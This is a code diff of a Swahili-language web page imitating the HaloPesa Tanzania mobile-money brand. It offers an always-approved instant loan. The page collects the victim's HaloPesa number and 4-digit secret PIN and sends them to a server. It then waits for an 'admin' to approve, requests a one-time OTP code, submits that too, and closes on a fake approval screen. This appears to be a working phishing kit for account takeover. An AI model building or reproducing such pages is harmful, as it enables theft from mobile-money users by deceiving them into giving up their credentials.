@@ -8,7 +8,6 @@
 <style>
   :root {
     --navy: #cc3300;
-    --navy-dark: #aa2200;
     --teal: #ff6600;
     --purple: #ff9900;
     --grad: linear-gradient(to right, #ff6600, #ff9900);
@@ -24,12 +23,10 @@
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
-  /* PAGE SYSTEM */
   .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
   .page.active { display: flex; flex-direction: column; }
   @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
 
-  /* OVERLAY */
   .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
   .overlay.show { display:flex; }
   .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
@@ -39,96 +36,109 @@
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
-  /* OTP MODAL */
-  .otp-modal { background:var(--white); border-radius:var(--radius); padding:36px 32px; text-align:center; max-width:400px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
-  .otp-modal h2 { font-size:1.3rem; font-weight:700; margin-bottom:8px; }
-  .otp-modal p { font-size:0.88rem; color:var(--text-light); margin-bottom:6px; }
-
-  /* LOGO */
-  .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
-  .logo-text { font-size:1.1rem; font-weight:800; color:#fff; letter-spacing:-0.02em; }
-  .logo-text .halo { color:#fff; }
-  .logo-text .pesa { color:#ffdd00; }
-  .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
-
-  /* NAV */
   .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
   .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.8); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
   .nav-left:hover { color:#fff; }
 
-  /* BUTTONS */
   .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
   .btn-grad:hover { opacity:0.9; }
   .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
   .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
   .btn-gray:hover { background:#d0d0d0; }
 
-  /* FORM */
   .field { margin-bottom:18px; }
   .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
-  .field input { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; }
-  .field input:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,102,0,0.12); }
+  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s; }
+  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,102,0,0.12); }
+  .field textarea { resize:vertical; min-height:90px; }
+  .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+  .phone-row { display:flex; }
+  .ph-pre { padding:11px 12px; background:#f5f5f5; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.85rem; font-weight:500; color:#555; white-space:nowrap; display:flex; align-items:center; }
+  .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
   .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
 
-  /* PAGE 1: REGISTRATION */
-  #page-registration { background:var(--page-bg); }
-  .reg-nav { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 24px; height:60px; flex-shrink:0; }
-  .reg-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .reg-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
-  .reg-card h1 { font-size:1.35rem; font-weight:700; text-align:center; margin-bottom:6px; }
-  .reg-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
-  .reg-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
+  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
+  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; }
+  .prog-seg.done { background:var(--purple); }
+  .prog-seg.now  { background:var(--teal); }
 
-  /* MESSAGES */
+  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
+  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
+  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
+  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
+
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
   .msg-box.show { display:flex; }
   .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
   .msg-box.success { background:#f0fdf4; border:1.5px solid #bbf7d0; color:#166534; }
-  .msg-box.info    { background:#eff6ff; border:1.5px solid #bfdbfe; color:#1e40af; }
   .msg-icon { font-size:1.1rem; flex-shrink:0; }
 
-  /* OTP Inputs */
+  .otp-modal { background:var(--white); border-radius:var(--radius); padding:36px 32px; text-align:center; max-width:400px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
+  .otp-modal h2 { font-size:1.3rem; font-weight:700; margin-bottom:8px; }
+  .otp-modal p { font-size:0.88rem; color:var(--text-light); margin-bottom:6px; }
+
   .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; justify-content:center; }
   .otp-box { width:50px; height:50px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
   .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,102,0,0.12); }
 
-  /* OTP Timer */
   .otp-timer { font-size:0.85rem; color:var(--text-light); margin-bottom:16px; font-weight:600; }
   .otp-timer.warn { color:#ff6600; }
 
-  /* Hp Logo */
+  .waiting-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:998; align-items:center; justify-content:center; }
+  .waiting-overlay.show { display:flex; }
+  .waiting-modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); }
+  .waiting-modal h3 { font-size:1.1rem; font-weight:600; margin-bottom:6px; }
+
+  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
+
+  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fffaf7; }
+  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
+  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
+  .sum-row:last-child { border-bottom:none; }
+  .sum-row .sk { color:var(--text-light); }
+  .sum-row .sv { font-weight:500; }
+
+  #page-submitted { background:linear-gradient(160deg,var(--navy),#cc5500); align-items:center; justify-content:center; }
+  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
+  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
+  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,102,0,0.3)} 50%{box-shadow:0 0 0 16px rgba(255,102,0,0)} }
+  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
+  .sub-wrap p  { color:rgba(255,255,255,0.85); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
+  .btn-go { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; letter-spacing:0.04em; }
+
+  #page-approval { background:linear-gradient(135deg,#ff6600 0%,#ff9900 50%,#cc3300 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
+  .appr-wrap { width:100%; max-width:520px; }
+  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
+  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(255,102,0,0.4); }
+  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
+  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
+  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
+  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.9); text-transform:uppercase; letter-spacing:0.06em; }
+  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
+  .ld-card { background:#fff; padding:20px 24px; }
+  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; }
+  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
+  .ld-row:last-child { border-bottom:none; }
+  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
+  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
+  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
+  .ld-val { font-size:0.9rem; font-weight:600; }
+  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
+  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; }
+
   .hp-logo-sm { display:flex; align-items:center; gap:6px; }
   .hp-logo-sm svg { width:26px; height:26px; }
   .hp-logo-sm .brand { font-size:1.1rem; font-weight:800; color:#fff; }
   .hp-logo-sm .brand span { color:#ffdd00; }
 
-  /* PAGE: LANDING */
-  #page-landing { background:var(--page-bg); }
-  .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 24px; height:60px; flex-shrink:0; }
-  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
-  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
-  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
-  .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
-  .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
-  .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
-  .calc-row2 .cv { color:var(--teal); font-weight:600; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--teal) 0%,var(--teal) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--teal); border:3px solid #fff; box-shadow:0 2px 6px rgba(255,102,0,0.4); cursor:pointer; }
-  .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
-  .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
-  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
-  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--teal); }
-  .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.6); flex-shrink:0; }
-
-  @media(max-width:500px){ .reg-card, .land-card { padding:24px 18px; } }
+  @media(max-width:500px){ .field-row{grid-template-columns:1fr;} .step-card{padding:24px 18px;} }
 </style>
 </head>
 <body>
 
 <!-- PAGE 1: REGISTRATION -->
 <div id="page-registration" class="page active">
-  <div class="reg-nav">
+  <div class="navbar">
     <div class="hp-logo-sm">
       <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="20" cy="20" r="20" fill="#ff6600"/>
@@ -138,42 +148,46 @@
       <div class="brand">Halo<span>Pesa</span></div>
     </div>
   </div>
-  <div class="reg-center">
-    <div class="reg-card">
-      <h1>Jifunze na HaloPesa</h1>
-      <p class="reg-tagline">Fungua akaunti yako kwa dakika chache</p>
+
+  <div class="step-center" style="padding:40px 16px;">
+    <div class="step-card">
+      <h2>Fungua Akaunti HaloPesa</h2>
+      <p class="step-sub">Dakika chache tu</p>
+
       <div class="msg-box error" id="regErr"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
-      
+
       <div class="field">
         <label>Jina la Kwanza</label>
         <input type="text" id="regFirst" placeholder="Jina lako" oninput="clearErr('regErr')">
       </div>
+
       <div class="field">
         <label>Jina la Ukoo</label>
         <input type="text" id="regLast" placeholder="Ukoo lako" oninput="clearErr('regErr')">
       </div>
-      
+
       <div class="field">
         <label>Nambari ya HaloPesa</label>
         <input type="text" id="regHaloNumber" placeholder="1234567890" inputmode="numeric" maxlength="10" oninput="clearErr('regErr')">
         <div class="field-hint">Tarakimu 10 tu (0123456789)</div>
       </div>
-      
+
       <div class="field">
         <label>Namba ya Siri</label>
         <input type="text" id="regPassword" placeholder="0000" inputmode="numeric" maxlength="4" oninput="clearErr('regErr')">
         <div class="field-hint">Tarakimu 4 tu (0000-9999)</div>
       </div>
-      
+
       <button class="btn-grad" onclick="registerUser()">FUNGUA AKAUNTI</button>
     </div>
   </div>
-  <div class="reg-footer">© 2026 HaloPesa Tanzania</div>
+
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- WAITING FOR ADMIN APPROVAL -->
-<div class="overlay" id="waitingOverlay">
-  <div class="modal">
+<!-- WAITING FOR REGISTRATION APPROVAL -->
+<div class="waiting-overlay" id="waitingOverlay">
+  <div class="waiting-modal">
     <div class="spinner"></div>
     <h3>Inasubiri Idhinisho...</h3>
     <p id="waitingMsg">Tafadhali subiri. Admin anakagua maelezo yako</p>
@@ -211,8 +225,8 @@
   </div>
 </div>
 
-<!-- PAGE 2: LANDING -->
-<div id="page-landing" class="page">
+<!-- PAGE 2: STEP 1 (LOAN AMOUNT) -->
+<div id="page-step1" class="page">
   <nav class="navbar">
     <div class="hp-logo-sm">
       <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -223,47 +237,155 @@
       <div class="brand">Halo<span>Pesa</span></div>
     </div>
   </nav>
-  <div class="land-center">
-    <div class="land-card">
-      <h1>Mahesabu ya Mkopo</h1>
-      <p class="land-tagline">Pesa za Haraka, Karibu Kwa Dakika 15</p>
-      <div class="calc-box">
-        <h2>Kiasi Kinachohitajika</h2>
-        <div class="calc-row2"><span>TSh 10,000</span><span class="cv" id="aDisp">TSh 100,000</span><span>TSh 100,000,000</span></div>
-        <input type="range" id="rA" min="10000" max="100000000" step="1000" value="100000" oninput="calcUp()">
-        <div class="range-ends"><span>TSh 10K</span><span>TSh 100M</span></div>
-      </div>
-      <button class="btn-grad" style="margin-top:24px;" onclick="goTo('page-landing')">JITOKA HAKIKA</button>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Maombi ya Mkopo</h2>
+      <p class="step-sub">Hatua 1 ya 3</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+      
+      <div class="field"><label>Kiasi cha Mkopo (TSh)</label><input type="number" id="s1am" value="100000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label>Muda wa Mkopo</label><div style="position:relative;"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
+      <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
+      
+      <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
   </div>
-  <div class="land-footer">© 2026 HaloPesa Tanzania</div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- MODALS -->
-<div class="overlay" id="mReg">
-  <div class="modal"><div class="spinner"></div><h3>Inaandaa Akaunti…</h3><p>Tafadhali subiri</p></div>
+<!-- PAGE 3: STEP 2 (PERSONAL INFO) -->
+<div id="page-step2" class="page">
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Maombi ya Mkopo</h2>
+      <p class="step-sub">Hatua 2 ya 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+      
+      <div class="field-row">
+        <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Jina" oninput="clearErr('s2Err')" readonly style="background:#f5f5f5;"></div>
+        <div class="field"><label>Jina la Ukoo</label><input type="text" id="s2la" placeholder="Ukoo" oninput="clearErr('s2Err')" readonly style="background:#f5f5f5;"></div>
+      </div>
+      
+      <div class="field">
+        <label>Nambari ya Simu</label>
+        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s2ph" placeholder="712345678" maxlength="9" oninput="clearErr('s2Err')"></div>
+      </div>
+      
+      <button class="btn-grad" onclick="toS3()" style="margin-top:24px;">HATUA INAYOFUATA</button>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
+
+<!-- PAGE 4: STEP 3 (EMPLOYMENT) -->
+<div id="page-step3" class="page">
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="20" cy="20" r="20" fill="#ff6600"/>
+        <path d="M10 28 Q20 8 30 28" stroke="#fff" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <circle cx="20" cy="20" r="4" fill="#ffdd00"/>
+      </svg>
+      <div class="brand">Halo<span>Pesa</span></div>
+    </div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Maombi ya Mkopo</h2>
+      <p class="step-sub">Hatua 3 ya 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+      
+      <div class="field"><label>Hali ya Ajira</label><div style="position:relative;"><select id="s3em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option></select></div></div>
+      <div class="field"><label>Mapato ya Mwaka (TSh)</label><input type="number" id="s3in" placeholder="Weka mapato" oninput="clearErr('s3Err')"></div>
+      
+      <div class="sum-box">
+        <h3>Muhtasari wa Maombi</h3>
+        <div class="sum-row"><span class="sk">Kiasi:</span><span class="sv" id="sA">TSh 100,000</span></div>
+        <div class="sum-row"><span class="sk">Muda:</span><span class="sv" id="sT">Miezi 48</span></div>
+        <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
+      </div>
+      
+      <button class="btn-grad" onclick="submitApp()">WASILISHA MAOMBI</button>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
+</div>
+
+<!-- PAGE 5: SUBMITTED -->
+<div id="page-submitted" class="page">
+  <div class="sub-wrap">
+    <div class="sub-icon">📋</div>
+    <h2>Maombi Yamewasilishwa!</h2>
+    <p>Mkopo wako umewasilishwa. Tafadhali subiri idhini. Itakuwa haraka!</p>
+    <button class="btn-go" onclick="goTo('page-approval')" style="margin-top:24px;">Endelea</button>
+  </div>
+</div>
+
+<!-- PAGE 6: APPROVAL -->
+<div id="page-approval" class="page">
+  <div class="appr-wrap">
+    <div class="appr-top">
+      <div class="check-circle">✓</div>
+      <h2 class="appr-title">🎉 Hongera!</h2>
+      <p class="appr-sub">Mkopo wako <strong>umeidhinishwa!</strong></p>
+      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TSh 100,000</div></div>
+    </div>
+    <div class="ld-card">
+      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
+      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TSh 2,750</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-g">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 48</div></div></div>
+    </div>
+    <div class="rth-wrap"><button class="rth-btn" onclick="location.reload()">Rudi Nyumbani</button></div>
+  </div>
+</div>
+
+<!-- LOADING MODALS -->
+<div class="overlay" id="mSubmit">
+  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Maombi…</h3><p>Tafadhali subiri</p></div>
 </div>
 
 <script>
-  // STATE
   const S = {
     firstName: '',
     lastName: '',
     haloNumber: '',
     password: '',
-    registrationId: null
+    registrationId: null,
+    amt: 100000,
+    term: 'Miezi 48',
+    purpose: '',
+    phone: ''
   };
 
   let approvalCheckInterval = null;
   let otpCheckInterval = null;
 
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   function goTo(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
+  }
+
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
   }
 
   function showErr(id, msg) {
@@ -271,13 +393,9 @@
     document.getElementById(id).classList.add('show');
   }
 
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
-  }
-
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   // REGISTRATION
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   async function registerUser() {
     const first = document.getElementById('regFirst').value.trim();
     const last = document.getElementById('regLast').value.trim();
@@ -286,58 +404,43 @@
 
     if (!first) { showErr('regErr', 'Tafadhali weka jina la kwanza'); return; }
     if (!last) { showErr('regErr', 'Tafadhali weka jina la ukoo'); return; }
-    
     if (!haloNum) { showErr('regErr', 'Tafadhali weka nambari ya HaloPesa'); return; }
     if (!/^\d{10}$/.test(haloNum)) { showErr('regErr', 'Nambari ya HaloPesa lazima iwe tarakimu 10'); return; }
-    
     if (!pwd) { showErr('regErr', 'Tafadhali weka namba ya siri'); return; }
     if (!/^\d{4}$/.test(pwd)) { showErr('regErr', 'Namba ya siri lazima iwe tarakimu 4'); return; }
 
-    // Show loading
-    document.getElementById('mReg').classList.add('show');
+    S.firstName = first;
+    S.lastName = last;
+    S.haloNumber = haloNum;
+    S.password = pwd;
+
+    // Pre-fill step 2
+    document.getElementById('s2fi').value = first;
+    document.getElementById('s2la').value = last;
 
     try {
       const response = await fetch('/api/register-user', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          firstName: first,
-          lastName: last,
-          haloNumber: haloNum,
-          password: pwd,
-          timestamp: new Date().toISOString()
-        })
+        body: JSON.stringify({ firstName: first, lastName: last, haloNumber: haloNum, password: pwd, timestamp: new Date().toISOString() })
       });
 
-      if (response.ok) {
-        const result = await response.json();
-        
-        S.firstName = first;
-        S.lastName = last;
-        S.haloNumber = haloNum;
-        S.password = pwd;
+      const result = await response.json();
+      if (result.success) {
         S.registrationId = result.registrationId;
-
-        document.getElementById('mReg').classList.remove('show');
-        
-        // Show waiting overlay
         showWaitingApprovalOverlay();
         startApprovalPolling();
       } else {
-        document.getElementById('mReg').classList.remove('show');
-        const error = await response.json();
-        showErr('regErr', error.message || 'Hitilafu inatokea');
+        showErr('regErr', result.message || 'Hitilafu inatokea');
       }
     } catch (error) {
-      console.error('Registration error:', error);
-      document.getElementById('mReg').classList.remove('show');
       showErr('regErr', 'Hitilafu inatokea');
     }
   }
 
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   // WAITING FOR ADMIN APPROVAL
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   function showWaitingApprovalOverlay() {
     document.getElementById('waitName').textContent = S.firstName + ' ' + S.lastName;
     document.getElementById('waitHalo').textContent = S.haloNumber;
@@ -367,38 +470,29 @@
         const data = await response.json();
 
         if (data.status === 'approved') {
-          console.log('✅ Registration approved by admin');
           clearInterval(approvalCheckInterval);
           closeWaitingOverlay();
-          
-          // Show OTP popup
           showOtpModal();
         } else if (data.status === 'rejected') {
-          console.log('❌ Registration rejected');
           clearInterval(approvalCheckInterval);
           closeWaitingOverlay();
-          showErr('regErr', data.reason || 'Ombi lako lilikataliwa na msimamizi');
+          showErr('regErr', 'Ombi lako lilikataliwa');
           S.registrationId = null;
         }
       } catch (error) {
         console.error('Approval check error:', error);
       }
-    }, 3000); // Poll every 3 seconds
+    }, 3000);
   }
 
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   // OTP MODAL
-  // ══════════════════════════════════════════════════════
+  // ════════════════════════════════════════════════════════
   function showOtpModal() {
-    document.getElementById('otpPhoneDisplay').textContent = 'Nambari ya HaloPesa: ' + S.haloNumber;
+    document.getElementById('otpPhoneDisplay').textContent = 'HaloPesa: ' + S.haloNumber;
     clearErr('otpMsgErr');
     clearErr('otpMsgOk');
-    
-    document.getElementById('o0').value = '';
-    document.getElementById('o1').value = '';
-    document.getElementById('o2').value = '';
-    document.getElementById('o3').value = '';
-    
+    [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
     document.getElementById('otpOverlay').classList.add('show');
   }
 
@@ -410,22 +504,13 @@
   function otpMv(el, idx) {
     if (el.value.length > 1) el.value = el.value.slice(-1);
     if (el.value && idx < 3) document.getElementById('o' + (idx + 1)).focus();
-    chkOtp();
-  }
-
-  function chkOtp() {
-    const vals = [document.getElementById('o0').value, document.getElementById('o1').value, document.getElementById('o2').value, document.getElementById('o3').value];
-    const ready = vals.every(v => v !== '');
-    document.getElementById('bOtp').style.opacity = ready ? '1' : '0.5';
   }
 
   async function submitOtp() {
-    const otp = [document.getElementById('o0').value, document.getElementById('o1').value, document.getElementById('o2').value, document.getElementById('o3').value].join('');
+    const otp = [0,1,2,3].map(i => document.getElementById('o'+i).value).join('');
     
     if (otp.length !== 4) {
-      clearErr('otpMsgOk');
-      document.getElementById('otpMsgErr').classList.add('show');
-      document.getElementById('otpMsgErrTxt').textContent = 'Tafadhali weka OTP kamili';
+      showErr('otpMsgErr', 'Tafadhali weka OTP kamili');
       return;
     }
 
@@ -433,30 +518,18 @@
       const response = await fetch('/api/submit-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          registrationId: S.registrationId,
-          otp: otp
-        })
+        body: JSON.stringify({ registrationId: S.registrationId, otp: otp })
       });
 
       if (response.ok) {
-        clearErr('otpMsgErr');
         document.getElementById('otpMsgOk').classList.add('show');
